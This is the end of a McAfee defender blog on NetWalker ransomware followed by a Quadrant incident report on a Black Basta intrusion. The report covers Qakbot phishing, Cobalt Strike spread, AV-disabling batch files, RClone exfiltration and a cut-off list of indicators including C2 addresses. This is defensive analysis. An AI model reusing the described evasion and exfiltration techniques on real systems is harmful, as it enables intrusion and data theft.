CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR Defensive Evasion Deobfuscate/Decode Files or Information (T1140) CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR Defensive Evasion Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR Credential Access Credential Dumping (T1003) Mimikatz, Mimidogz, Mimikittenz, Pwdump, LaZagne, Windows Credentials CSC 4 Controlled Use of Admin Privileges CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Credential Access Brute Force (T1110)
NL Brute CSC 4 Controlled use of admin privileges CSC 16 Account Monitoring Enterprise Security Manager – Log Analysis Impact Stage Defensive Overview 
The impact stage is where the attacker encrypts the target system, data and perhaps moves laterally to other systems on the network.
Protection at this stage is heavily dependent on adaptable anti-malware on both end user devices and servers, network controls and security operation’s capability to monitor logs for anomalies in privileged access or network traffic.
The following chart summarizes the controls expected to have the most effect against impact stage techniques and the McAfee solutions to implement those controls where possible. 
MITRE Tactic MITRE Techniques CSC Controls McAfee Portfolio Mitigation Discovery Network Service Scanning (T1046) Network Scanner CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Endpoint Security Platform 10.7, Threat Prevention, Application Control (MAC), Network Security Platform Lateral Movement Third Party Software (T1072) TeamViewer, Anydesk CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Endpoint Security Platform 10.7, Threat Prevention, Network Security Platform Lateral Movement Service Execution (T1035) PS Exec CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Endpoint Security Platform 10.7, Threat Prevention, MVISION EDR Collection Data from Information Repositories (T1213) 
CSC 4 Control Admin Privileges CSC 5 Secure Configuration CSC 6 Log Analysis Enterprise Security Manger – Log Collection and Analysis Collection Data from local system (T1005) 
CSC 4 Control Admin Privileges CSC 5 Secure Configuration CSC 6 Log Analysis Endpoint Security Platform 10.7, Threat Prevention, MVISION EDR Collection Data from network shared drive (T1039) 
CSC 4 Control Admin Privileges CSC 5 Secure Configuration CSC 6 Log Analysis Endpoint Security Platform 10.7, Threat Prevention, MVISION EDR Command and Control Ingress Tool Transfer (T1105) 
CSC 8 Malware Defenses CSC 12 Boundary Defenses Web Gateway, Network Security Platform Impact Data Encrypted (T1486) Netwalker Ransomeware CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR, Web Gateway Impact Inhibit System Recovery (T1490) Shadow CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR, Web Gateway Hunting for NetWalker Indicators 
As a threat intel analyst or hunter, you might want to quickly scan your systems for any of NetWalker indicators.
Of course, you can do that manually by downloading a list of indicators and searching with available tools.
However, if you have MVISION EDR, you will be able to that search right from Insights, saving precious time.
Hunting the attacker can be a game of inches so every second counts.
Of course, if you found infected systems or systems with indicators, you can take action to contain and start an investigation for incident response immediately from the MVISION EDR console. 
Proactively Detecting NetWalker Techniques Many of the exploit stage techniques in this attack use legitimate Windows tools or valid accounts to either exploit, avoid detection or move laterally.
These techniques are not easily prevented but can be detected using MVISION EDR.
As security analysts, we want to focus on suspicious techniques, such as PowerShell, used to download files… or execute scripts… or evade defenses… Monitoring or Reporting on NetWalker Events Events from McAfee Endpoint Protection and Web Gateway play a key role in NetWalker incident and threat response.
McAfee ePO centralizes event collection from all managed endpoint systems.
As a threat responder, you may want to create a dashboard for NetWalker-related threat events to understand current exposure.
Here is a list (not exhaustive) of NetWalker-related threat events as reported by Endpoint Protection Platform Threat Prevention Module and McAfee Web Gateway. 
McAfee Endpoint Threat Prevention Events Ransom-NetW!AB8D59ABA3DC GenericRXKU-HO!E33E060DA1A5 PS/Netwalker.a Ransom-NetW!1B6A2BFA39BC Artemis!2F96F8098A29 GenericRXKD-DA!645C720FF0EB GenericRXKD-DA!4E59FBA21C5E Ransom-NetW!A9E395E478D0 Ransom-NetW!A0BC1AFED896 PS/Netwalker.c Artemis!F5C877335920 GenericRXKD-DA!B862EBC24355 Artemis!2F96F8098A29 GenericRXKD-DA!63EB7712D7C9 RDN/Ransom GenericRXKD-DA!F0CC568491CD Artemis!0FF0D5085F7E GenericRXKD-DA!9172586C2F87 RDN/Generic.dx Ransom-NetW!BFF6F7B3A7DB Ransom-NetW!7B77B436360A GenericRXKD-DA!BC75859695F6 GenericRXKD-DA!FCEDEA8111AB GenericRXKD-DA!5ABF6ED342FD PS/Netwalker.d GenericRXKD-DA!C0DDA75C6EAE GenericRXKD-DA!ADDC865F6169 GenericRXKD-DA!DBDD7A1F53AA Artemis!1527DAF8626C GenericRXKD-DA!608AC26EA80C Ransom-NetW!3A601EE68000 GenericRXKD-DA!8102821249E1 Ransom-NetW!2E2F5FE8ABA4 GenericRXKD-DA!F957F19CD9D7 GenericRXKD-DA!3F3CC36F4298 GenericRXKD-DA!9001DFA8D69D PS/Agent.bu GenericRXKD-DA!5F55AC3DD189 GenericRXKD-DA!18C32583A6FE GenericRXKD-DA!01F703234047 Ransom-NetW!62C71449FBAA GenericRXKD-DA!6A64553DA499 GenericRXKD-DA!0CBA10DF0C89 Artemis!50C6B1B805EC PS/Netwalker.b GenericRXKD-DA!59B00F607A75 Artemis!BC96C744BD66 GenericRXKD-DA!DE0B8566636D Ransom-NetW!8E310318B1B5 GenericRXKD-DA!0537D845BA09 GenericRXKU-HO!DE61B852CADA GenericRXKD-DA!B4F8572D4500 PS/Netwalker.c GenericRXKD-DA!D09CFDA29F17 PS/Agent.bx GenericRXKD-DA!0FF5949ED496 GenericRXKD-DA!2B0384BE06D2 GenericRXKD-DA!5CE75526A25C GenericRXKD-DA!BDC345B7BCEC Ransom-CWall!993B73D6490B GenericRXKD-DA!0E611C6FA27A GenericRXKU-HO!961942A472C2 Ransom-NetW!291E1CE9CD3E Ransom-Mailto!D60D91C24570 PS/Agent.bu GenericRXKU-HO!997F0EC7FCFA PS/Agent.bx Ransom-CWall!3D6203DF53FC Ransom-Netwalker Ransom-NetW!BDE3EC20E9F8 Generic .kk GenericRXKU-HO!1DB8C7DEA2F7 GenericRXKD-DA!DD4F9213BA67 GenericRXKD-DA!729928E6FD6A GenericRXKU-HO!9FB87AC9C00E GenericRXKU-HO!187417F65AFB PS/Netwalker.b McAfee Web Gateway Events RDN/Ransom BehavesLike.Win32.RansomCWall.mh BehavesLike.Win32.Generic.kh Ransom-NetW!1B6A2BFA39BC BehavesLike.Win32.MultiPlug.kh Ransom:Win32/NetWalker.
H!rsm BehavesLike.Win32.Generic.qh BehavesLike.Win32.Trojan.kh GenericRXKD-DA!DD4F9213BA67 BehavesLike.Win32.Ipamor.kh BehavesLike.Win64.Trojan.nh BehavesLike.Win32.Generic.cz RDN/Generic.dx BehavesLike.Win32.RansomCWall.mm BehavesLike.Win64.BadFile.nh BehavesLike.Win32.Generic.dm Summary Ransomware has evolved into a lucrative business for threat actors, from underground forums selling ransomware, to offering services such as support portals to guide victims through acquiring crypto currency for payment, to the negotiation of the ransom.
However, just as attackers work together, defenders must collaborate internally and externally to build an adaptive security architecture which will make it harder for threat actors to succeed and build resilience in the business.
This blog highlights how to use McAfee’s security solutions to prevent, detect and respond to NetWalker and attackers using similar techniques. 
McAfee ATR is actively monitoring ransomware threats and will continue to update McAfee MVISION Insights and its social networking channels with new and current information.
Want to stay ahead of the adversaries?
Check out McAfee MVISION Insights for more information. 
The post McAfee Defender’s Blog: NetWalker appeared first on McAfee Blog. 
title: Technical Analysis: Black Basta Malware Overview url: https://quadrantsec.com/resource/technical-analysis/black-basta-malware-overview INTRODUCTION Quadrant was recently able to aid a client during an organization wide compromise by the Black Basta ransomware group.
This group is a “Ransomware as a Service” (RaaS) organization known to target medium and large companies.
The following contains an overview of the compromise as it progressed, as well a technical analysis of the malware and techniques observed, ranging from a successful phishing campaign to the attempted ransomware detonation.
Although some exact details of the threat actor’s actions are still unknown, the evidence gathered has allowed for inferences into many of the gaps.
The names of all clients, all accounts, and some files have been modified for client confidentiality.
Indicators of compromise, including malicious domain names, have not been modified.
Any log modification has been made to redact client information, break potential links, or for readability. 
RELATED TO THIS STORY 
The timeline below shows a high-level overview of the incident: INITIAL ACCESS The Threat Actor began this attack by compromising a user account at a third-party vendor (TPV).
Although little is known to Quadrant about the compromise on the TPV, access allowed for the use of an "info@" account.
The use of such an account would have allowed the Threat Actor to pose as the compromised user without creating extra "junk" in the user's inbox which could raise suspicion.
Following initial phishing emails, the threat actor continued to submit additional phishing emails to the client via similar account names from different domains.
Both samples reached their victims shortly after noon on the 20th of September 
The phishing emails contained what was later determined to be "Qakbot," a sophisticated trojan.
Following the infection, these hosts began to beacon on out to over 100 IP's using various ports.
The client’s Cisco “Advanced Malware Protection” (AMP) detected a connection with one of these IP's over TCP port 2222.
Although this did trigger an alert in AMP, the Quadrant ingestion of these logs was not configured, so this did not generate an alert through the Sagan Solution. 
The Suricata engine did detect these connection attempts, however no alert was raised by the Packet Inspection Engine.
Quadrant monitors companies' ingress and egress traffic using onsite Packet Inspection Engine (PIE) appliances running the Suricata Detection engine.
Although many other rulesets are used to screen for malicious activity, Quadrant has custom rules in place to detect SSH over nonstandard ports, such as TCP 2222.
These rules did not fire due to the absence of an SSH header in the traffic.
One may assume that traffic over 2222 would be SSH traffic, however further analysis of the traffic generated by the Qakbot Sample in the lab shows that this connection was likely HTTPS in nature. 
Eventually, the malware was able to find an active C2 server.
It took about 35 minutes between initial infection and the first successful communication between a compromised host and the C2 domain.
The second stage payload, which was later determined to likely be the penetration testing framework "Brute Ratel," was then downloaded via a connection to an IP from Russia. 
PERSISTENCE AND ESCALATION OF PRIVILEGE Following the compromise of two hosts and gaining a foot hold, lateral movement began.
The client's full infrastructure is comprised of three domains: Construction, Commerce, and a Subsidiary.
Both initial compromised hosts were in the Construction environment.
These domains had shared trust and were connected via VPN tunnels which allowed the threat actor to move freely between domains. 
We believe that multiple methods and tools were leveraged in order to do this.
At this point, visibility becomes muddled due to the focus of observation and detection is ingress and egress traffic.
However, following the investigation into the recorded logs and the follow-on detailed analysis of malware samples, we can make educated guesses on some of the missing pieces. 
Initial lateral movement and the lay of the land was likely conducted using Brute Ratel.
This was determined through a review of files found on one of the initially compromised hosts.
One file, "zfgufgfvezdnbcvjkzctpvfdj.dll," matches the hash of previously submitted Brute Ratel samples. 
Due to the lack of visibility, we were unable to find the initial connection from the two "Patient Zeros" to the local Domain Controller.
However, after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains. 
Initial Command and Control was conducted from "23[.]19[.]58[.]43"[zedorocop[.]com] and "23[.]106[.]160[.]141" [danimos[.]com].
The IP’s used for C2 and the level of interaction changed over time as the compromise grew. 
For example, mid-stage infections showed calls to "146[.]70[.]86[.]44"[gerhiles[.]com].
It’s important to note that the FQDN’s that were used as C2 were all registered the same month as the compromise. 
Multiple administrative and system accounts were compromised during this incident.
One possible explanation for this comes from “Kerberoasting”.
This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.
We do not believe that this was successful in this environment, due in part to the lack of additional signs of compromise specific to this Domain.
However, this technique was likely performed on the other two client domains where visibility gaps existed.
This is further supported by the source and destination of these requests were cross domain: The source of the “Kerberoasting” was based in the Subsidiary environment and the Domain Controller that was attacked was in the Commerce environment. 
Once administrative access had been achieved, the threat actor also added new administrative accounts to the environment. 
PROPAGATION Unknown to everyone but the attacker, multiple files were being transmitted throughout the environment: Two file names were observed during the incident "Client_s.exe" and "Client.exe."
It is expected that the different naming schemes are related to the different variations of the Black Basta ransomware.
Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of "Client_s.exe" for Windows hosts. 
Two ".bat" files were sent throughout the organization.
Both were designed to turn off antivirus and anti-malware software.
One does not use any obfuscation and just contains the simple command to stop Cisco AMP Orbital.
This could indicate that it was written hastily in order to get it onto the target environments quickly.
The other, targeting Windows Defender, required multiple steps in order to view the commands. 
Tox5, which appeared to be a component of Cobalt Strike, as well as Cobalt Strike beacon with the name of "Ticket-5731.xls." These files continued to replicate throughout the organization though the use of Server qMessage Block (SMB), eventually spreading to almost every endpoint and server in two of the three domains.
The attack on the Commerce domain does not appear to have been effective, outside of one host in a training environment.
Most hosts in the Commerce environment HAD more restrictions placed on their operating system by default which likely contributed to the lack of success by the threat actors in the Commerce environment. 
EXFILTRATION 
Once a file server was identified, an FTP connection was established to an external site.
This was not used for C2 activities but only for receiving the exfiltrated data.
Suricata logs show that “RClone” was downloaded on the file servers in order to facilitate exfiltration of the logs.
RClone is designed to transfer large volumes of data from one host to the cloud with ease.
This legitimate program was abused by the attacker to steal client data. 
DETECTION AND RESPONSE The most critical asset of the Security Operations Center is the human SOC Analyst. 
A human can look at the totality of a situation and make a judgement call that no AI or automated process can.
From the analyst's perspective, the only alert that was generated and brought to the SOC was a Suricata FTP rule looking for CVE 1999-0911, related to an overflow using the MKD command.
This FTP command is defined as "...causes the directory specified in the pathname to be created on the server.
If the specified directory is a relative directory, it is created in the client's current working directory.
" Although many old signatures are decommissioned or otherwise suppressed, Quadrant leaves some rules in place as "hunting" rules.
These are more focused on the overall techniques or "odd" traffic that could be an indicator of compromise.
In this case, the analyst investigating the alert observed that this was technically a False Positive, as the command was not used in an abnormal fashion.
However, looking at the destination, which had not been previously observed in the environment, the file names (which were quite varied), and the volume of the files outbound, the analyst decided to call the client to err on the side of caution.
Had the analyst not conducted their due diligence or had this archaic signature been suppressed, it is highly likely that this compromise would not have been detected until after the encryption process had begun. 
The current list of rules developed following this incident can be found in I The alert was submitted at 18:27 EDT on 9/21/2022.
Just over 30 hours after the initial infection. 
The client determined it to be out of the ordinary but was unaware of the extent of the compromise.
However, during the course of the evening, it became apparent that something was greatly amiss.
The following morning, the client’s CISO contacted the Quadrant team to report that there was indeed an active compromise within their environment. 
The client provided malware samples from the phishing emails and the analysis began.
Threat hunting was conducted within the logs. 
A dedicated “out of bands” communications channel was established between Quadrant and the clients. 
As more evidence was uncovered, the full threat began to be realized. 
One aspect of the actions taken by the Incident Response team was a live log review.
The term "look for anything suspicious" is often a nightmare of a request, because how does one truly define suspicious without a base line.
However, with the amount of knowledge of the situation and years of experience on his side, a member of the I.R. team decided to look at the raw logs in real time to see if anything stood out. 
Windows Event logs and “clipboard” logs are collected using NXLog Enterprise. 
While clipboard logs are not stored on the local host, they are sent to the Sagan Log Analysis Engine for further analysis and retention. 
While examining this data, the I.R. team member became aware of the use of RDP by the Threat Actor by observing RDPClip.exe logging that looked, by definition, incredibly suspicious. 
Among the many “clipboard” logs observed, "Client.exe -bomb," stood out.
Although the full extent of the command was not realized at the time, due to the implied malice it was decided that now was the time to attempt to purge the threat actor. 
The Clients response team locked out the accounts that were known to be compromised.
However, the threat actor had complete control over the environment.
Following the initial attempt to lock out the threat actor, the threat actor retaliated. 
This resulted in a catastrophic lockout of the client's staff and administrators. 
This was not completely unexpected. 
Knowing that there was an ongoing data exfiltration attempt along with a full network compromise with a relatively short “dwell” time, plans had been put into place to restrict all access to the network in order to mitigate and prevent the threat actor from doing more damage. 
The client's staff was simply waiting on the “order” to halt the network. 
After quick conference between Quadrant and the client, all parties agreed and the decision was made: At approximately 8:45pm on September 22, only 56 hours after the initial phishing email had been opened, the physical cables from between the domains as well as their connection to the Internet were pulled. 
Because of the observation, hunting, and superior teamwork between the Quadrant team and the client, only a handful of ESXi servers were encrypted.
Had the team not taken action to sever the Internet and domain connections, the encryption command would likely have replicated throughout the Construction and Subsidiary environments.
With the assistance of a third-party incident response firm and constant ongoing contact with the Quadrant team, the client was able to slowly, systematically, and safely bring their servers on-line while purging any remains of the threat actor over the course of the next two weeks. 
Ultimately, this was considered a success in defense of the client.
But there were many lessons learned.
Through the later review of the logging and after-action analysis of the event, more detections rules have been created to better alert on what visibility does exist in this, and many other, client environments. 
TECHNICAL ANALYSIS INITIAL ACCESS: QAKBOT INFECTION 
The two phishing samples provided by the client show two different techniques: Email response as part of an Email Chain: "Re: RE: Logistics": 
The phishing email came from a legitimate vendor "stoneworkers".
The phishing attachment was submitted to the target in a response to an ongoing conversation that was being held between a member of Quadrant’s client and the TPV.
The attacker submitted the email from "info[@]stoneworkers[.]org" while posing as "jpeterman[@]stoneworkers[.]org".
The email had applicable context and the email chain contains back and forth to another member of the TPV as well. 
Cold Email: "Solution for Issue 37": 
The phishing email came with no pretext from a site not used by the client.
However, it is important to note that the site seems to be owned by a legitimate venture capital group, which may indicate a compromise of their organization or that the email account was spoofed.
The attacker submitted the email from "support[@]capitalizedadventures[.]com" while posing as "Jay Peterman". 
From the two phishing emails, both attachments contain similar malware.
Only changes to the filenames and corresponding commands were observed between the two. 
When downloaded, the initial attachment is a local HTML file.
The web page claims to be an adobe site and that the attached document is a PDF which is password protected: Using the password "abc888" to unzip the attachment, the user is presented with an ISO file.
The two samples produced different ISO names: Claim_Copy_1796.iso and Claim_Copy_5898.iso. 
The subdirectories to the fathomed directory, elude, omicron, and shabbily, are all empty as confirmed by navigating to them and running "ls -a" and returning no files.
This was verified through "du -h" which resulted in 4.0k size, which is consistent of an empty directory. 
When opened in a Windows environment the following is displayed: The ISO mounts as a DVD Drive.
The "Claim_Copy" shows the icon for windows file explorer.
Clicking on these calls the corresponding JavaScript file contained within each iso. 
In both cases the JavaScript files set several variables before running the ".cmd" file contained within the ISO.
This is likely done as a method to avoid detection from Log Analysis Engines, such as the Sagan Engine, as well as other monitoring services such as Microsoft's Defender or Sentinel. 
The command is called with echo off, so that no text will be displayed to the user.
Ultimately, this CMD file calls the "db" file.
In both samples, the "db" file is not a database, but is the actual Qakbot trojan. 
Something interesting to note: the "campus.txt" contains an excerpt from "Through the Looking Glass" by Lewis Carol.
This inclusion may be to add easily changeable padding to the ISO.
Doing so would allow the easy addition or subtraction of data in order to change the ISO’s hash value without changing any important content of the executables. 
Following detonation of Qakbot, the malware copied itself to "$CURRENTUSER\AppData\Roaming\Microsoft\Isoaahffo\djkuuhd.dll," as confirmed by the file's hashes shown below, and sets itself to auto run.
Following this, the malware begins to beacon out to hard coded C2 servers.
A breakdown of the observed IP’s and their ports can be found in the INDEX A below.
This contains over 100 IP’s for potential C2 servers. 
During the initial detonation of 5898, the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660). 
Further analysis of the registry keys added by the sample were able to be decrypted by leveraging the decryption script found at the link "https://github.com/drole/qakbot-registry-decrypt".
These show the full path to the dropped file "xjkuuhd.dll" as well as the Qakbot campaign identifier: "obama206." 
As with the case with other Qakbot investigations, multiple potential IP’s were observed during the testing.
During the incident, the first warning sign of compromise came from the victims Cisco Advanced Malware Protection alerting.
Cisco AMP detected an attempt to contact "76[.]169[.]76[.]44"[Van Nuys, CA] over TCP port 2222.
It is interesting to note that other IP’s were attempted to be reached over port TCP 2222, however, this C2 node was the only IP to return any data over TCP port 2222, which may be why this alert triggered.
According to Suricata logs, this was also the first IP that was reached out to via 2222.
A later review of the logs revealed that the first attempt to contact the C2 ip’s ("61[.]70[.]29[.]53"[Taiwan]). 
Due to TCP port 2222’s common use as an alternate port for SSH communication, the Malware Analyst recorded a manual SSH connection to the emulated C2 host in order to show the difference between an SSH connection and the connection made by the Malware sample.
Evidence suggests that the sample does not communicate over SSH and the communication is consistent with HTTP/S traffic. 
The malware analyst attempted to connect via SSH to the emulated C2 host.
Note the first packet from the experimental machine to the emulated C2 device following the 3-way TCP handshake shows header information containing the OpenSSH client information.
This was produced manually as an example of an SSH connection while SSH was running on the emulated C2 host on port 2222.
An overview of the lab setup and tools can be found in INDEX B. While continuing to run the SSH client on the emulated C2 device, the malware was detonated on the VM, we can see that the same packet following the 3-way handshake no longer contains SSH information but is detected as a Client Hello. 
The emulated C2 Server is now running an HTTPS server on TCP port 2222.
This PCAP above shows the conversation from the 3-way handshake to the resetting of the connection. 
Following observation of the malware samples, we now know that most of the connection attempts to the C2 IP’s are conducted over TCP port 443.
Because of the common use of this port, and the use of TLS in these connections, both attempts and the successful connections went undetected by Suricata and Cisco AMP. 
Many of the connections over 443 resulted in minimal connections consistent with nothing more than TCP negations. 
However, IP’s "119[.]42[.]124[.]18"[Thailand] and "193[.]3[.]19[.]37"[Russia] showed multiple packets and data transferred, including the exchange of TLS certificates.
The size and length of connection indicates that the second stage was downloaded from "193[.]3[.]19[.]37"[Russia]. 
The largest connection between P0 and the C2 domain.
Because of the amount of data outbound, this also may indicate some data exfiltration or interaction with the downloaded second stage from the C2. 
POST-EXPLOITATION TECHNIQUES, TACTICS, AND PROCEDURES COMMAND AND CONTROL Initial Command and Control was initially conducted from "23.19.58.43"[zedorocop[.]com] and "23.106.160.141" [danimos[.]com].
It’s important to note that the FQDN’s that were used as C2 were all registered the same month as the compromise. 
POTENTIAL COBALT STRIKE INSTALLATION - TOX5.EXE Initial static review of the tox5 sample did not reveal much information, indicators show that this may have the ability to clear event logs. 
A dynamic analysis of "Tox5" shows the malware drops itself in a randomly generated name folder under the "ProgramData" directory and adds itself to a scheduled task. 
During the lab testing of the tox5 sample, we observed the sample gain persistence through duplication of the sample.
This is observed below by comparing the file hashes for "tox5.exe" and "C:\ProgramData\lplshr\basinqt.exe." 
Although no obvious signs of compromise were apparent to the user of the infected host, a review of the network traffic from the host showed the newly installed program reached out to "gerhiles[.]com", which had been observed during the incident as a Command and Control site. 
Following the resolution of gerhiles[.]com, and the activation of "INetSim" to simulate a website, the PCAP above shows connections were attempted over port 4001. 
Leveraging "netstat -a -n -o" revealed the PID of the service connecting on port 4001.
Task manager was then use to reveal the service running on PID 3488, which was renamed instance of Tox5. 
Because of the beaconing activity, persistence, and apparent ability to wipe event logs, it is likely that tox5 is a component of Cobalt Strike or similar framework. 
LATERAL MOVEMENT: SMB AND RDP Brute Ratel allows for lateral movement leveraging RPC to create SMB traffic.
Although no direct RPC actions were observed, possibly from lack of logging or the method of RPC use, multiple logs throughout the incident show the transfer of files using SMB.
Logging shows actions taken by the attacker that were recorded by RDPClip in the form of clipboard logging, indicating the use of Remote Desktop Protocol.[CI1] 
[SD2] After the connection to the internet and shared domains were severed, automated processes continued to propagate malware. 
Files commonly observed transferred via SMB include: Black Basta Ransomware "Client_s.exe" and "Client.exe" Cobalt Strike beacon with the name of "Ticket-5731.xls" ".bat" files designed to disable Cisco AMP / Microsoft Defender Clipboard logging
Showing the Transfer of Cobalt Strike Beacons using RDPClip: The first part of the command is below, with the payload redacted for size and ease of readability.
This occurred immediately following the clipboard transfer of the command "net stop Cisco AMP". 
The second encoded Base64 string was not only base64 but also Gziped for size and obfuscation.
This shows the decoded and uncompressed data. 
Leveraging the Cobalt Strike payload decoder from Github user "0xtornado" shows that the payloads were sent using the user agent below. 
Additional Files and commands observed transferred detected via clipboard logging: 
The following 31 commands were ran between Sep 22, 2022 @ 20:01:39.000 and Sep 22, 2022 @ 20:02:46.000.
The syntax indicates these are the commands used to reset the administrative passwords following the attempted lock out of the threat actor. 
According to Google translate, the Russian phrases translate to "bury along the way" and "launch with balloons".
This may be direct translations, however adding any additional character following the Russian phrases changes the translation to "Lock on Path", and "launch with balls" respectfully.
Also note the use of "-forcepath" and "-bomb". 
A search of Active Directory for users whose passwords never expire, and the last set date while writing to a file for later exfiltration: Stopping Cisco AMP / Disabling Microsoft Defender, these are the same commands as observed in the ".bat" files: Transfer and use of Ticket-5731.xls
(determined to be Cobalt Strike): Url to download "cob_12.dll" and "tox5.exe".
Although cob_12.dll was not collected for technical sample, tox5.exe was reviewed: Clipboard logging showing the “uninstall” commands for Windows Defender: Adding an Admin to ESXi environment: Domain Controller detection: Connection attempt to a "SH/WEB" domain: 
Command showing the use of "Bitsadmin" to transfer the Black Basta Ransomware: Connection from Client by threat actor: DISABLING ANTIVIRUS/MALWARE SOFTWARE USING ".BAT"
FILES 
The two ".bat" files that were sent throughout the organization were both designed to turn off Antivirus and Antimalware software.
It is interesting to note that “cc.bat” does not use any obfuscation and just contains the simple command to stop AMP Orbital.
This could indicate that it was written hastefully in order to get it onto the target environment. 
"cc.bat" is a simple script designed to stop Cisco AMP. 
“W.bat”, on the other hand, has some simple but clever obfuscation in place.
When using "vim” or another text editor, the .bat file appears to contain Chinese characters.
However, performing "cat" or "strings" reveals the actual data.
This uses a mixture of disguising the ASCII as UTF-16 via manipulating the start of the file, as well as obfuscating the data using a simple cypher.
The strings of characters following "set" act as the key.
When the script is executed, the system will swap out the numbers in the body for the place in the key string.
The link from Superuser[.]com in INDEX D goes into more specifics on how this is done. 
"w.bat" as viewed through a text editor.
For this example, the text editor "vim” was used to open the file: "w.bat" as viewed through the bash command "cat": 
After copying and pasting the body of "w.bat" into its own text document "w.txt", the team was able to run a lengthy "sed” command against the file to reveal the below: The sed statement used to decode the body of "w.bat": 
EXFILTRATION THROUGH RECLONE Once the file server was identified, an FTP connection was established to an external site.
Over the past several years, multiple cyber security firms and the FBI have posted increased observation of the use of “RClone” to exfil data.
Suricata logs show that RClone was downloaded on the file servers in order to facilitate exfiltration of the logs. 
Suricata Flow log from "Subsidiary PIE" to the IP resolved for “Rclone”.
This likely shows the connection containing the download of RCLONE. 
First connection on Subsidiary PIE to the external file dump: First connection on Construction PIE to the external file dump.
(Other logs are available showing the DNS request and download of RClone for the Construction domain as well): ENCRYPTION VIA BLACK BASTA RANSOMWARE 
Two file names were observed during the incident "Client_s.exe" and "Client.exe."
It is expected that the different naming schemes are related to the different variations of the ransomware.
Although no sample was able to be provided for Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of "Client_s.exe" for Windows hosts. 
From a static malware analysis review, very little was initially able to be obtained from the sample aside from the ".basta" suffix and a relation to "Fax." Static analysis conducted inside of x32dbg, showing a relation to "FAX" and the potential use of the directory "ProgramData": Upon detonation, running the malware sets itself up as the service "Fax" and enables it to start during safe boot.
The ransomware then proceeds to restart into safe mode using bcdedit.exe.
BCDEdit is a command line program in windows which is used to modify the “Boot Configuration Data.”
While in safe mode, the encryption of files occurs.
Once the encryption is complete, the system is then restarted into the standard operating mode. 
Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON, which indicates the creation of a Mutex: Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON, which shows the addition of "Fax" to the registry allowing it to start in Safemode: Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON which shows the use of BCDEdit to restart the host into safemode with networking: 
Following infection, the host restarts into safe mode where the encryption action takes place: Following the encryption, the computer then restarts into standard mode.
The background has been replaced to show "Your Network is Encrypted by the Black Basta group.
Instruction in the file readme.txt" the only files still accessible to the user are the "readme" files. 
During the end state of the active compromise, two flags were observed in Clipboard logging, "-bomb" and "-forcepath".
The writeups conducted by "Northwave-Security" and "Deepinstinct" share more light onto these flags.
These show that "bomb" designates a full detonation of all reachable hosts, and "forcepath" is for a specific instance or directory.
According to the recent writeups above, this indicates that this is one of the newest renditions of the malware. 
We are attempting to better understand the use of the "-bomb" flag and how it communicates with the other infected machines.
It is likely that the reason the machine is restarted into safe mode with networking indicates that this communication may occur at this time. 
INDEX
A: INDICATORS OF COMPROMISE FILE NAMES AND HASH VALUES File Name SHA-256 Hash Claim_Copy_1796.iso 2cf56e6c050d0c9d8ada6cdb79a8ed2b8bbc25cd7d33ccc79aeedb31b5ad00df damagesMeaning.js 7a39324822941014609f0fd7d05f1adbbccc3f36d79103e2589251680f3b6c63 centipede.gif e8f5fa12faea9430645853fbb24ce46a5a62cb906168dd17b62d865ddfe201e3 DecomposedLoners.cmd cd5b4bd824bad0be78e4cdf6d7fe8a950bd63f294713b8cb49de887d8a8410bc excite.jpg 4fd4fdedb11b76a24fba289e0b3a8ed07261f98d279932420c7af779663605f8 sinkers.db c4875bd0683467c1e5d44f80b1d5abf6ac9b6f5bf5b6750a1e653416a68ed006 Claim_Copy_5898.iso 474b800fa4f8c2638607b012029cb134b58534e7817fbf3658c9c1d8c78204fa Claim_Copy.lnk e2eb9029fd993a9ab386beb7ca4fa21a1871dc0c7568eb802cac1ea3c53cad8b campus.txt 319704f093b71286985716d87c6fb20d6ddc334be6f1ccc042de8c73f7f5df36 centipede.gif e8f5fa12faea9430645853fbb24ce46a5a62cb906168dd17b62d865ddfe201e3 clockwatcherMinty.js 14d53c3d675458863ee2b336a4203f680932181ff5db99bb2f1640ffd44947b5 excite.jpg 4fd4fdedb11b76a24fba289e0b3a8ed07261f98d279932420c7af779663605f8 meddled.db 4f7d97bf4803bf1b15c5bec85af3dc8b7619fe5cfe019f760c9a25b1650f4b7c unspoolingPeak.cmd 4b3eb841b765c4aeb6b273e42a60e1f8ba3d3d94c613a27cd6446a354c2b7285 w.bat 4e54d7ed5055bc0e7858d49aaec17bd3ed69e8da94262c6a379ddd81abc31b5e cc.bat 90e9bd336e51c88002e5e9a109c5fb0e57d2c90cd54d4bc7480b69fa302beb73 tox5.exe d4dd79c97b091dd31791456c56d727eb0b30af9c0172dd221556d28495b8a50f Client.exe 5b8bf891808be44f24156cf5430730e610c0df6eaaa4b062623a7a675d234b62 Cleint_s.exe 17eccc7e2ce38dafd41d68861da636d7c05290b95d4fd75ec87b819094702cf6 Zfgufgfvezdnbcvjkzctpvfdj.dll 62cb24967c6ce18d35d2a23ebed4217889d796cf7799d9075c1aa7752b8d3967 HARDCODED IP'S OBSERVED FROM QAKBOT SAMPLES IP Port Observed Country AbuseIPDB Score 1.10.253.207 443 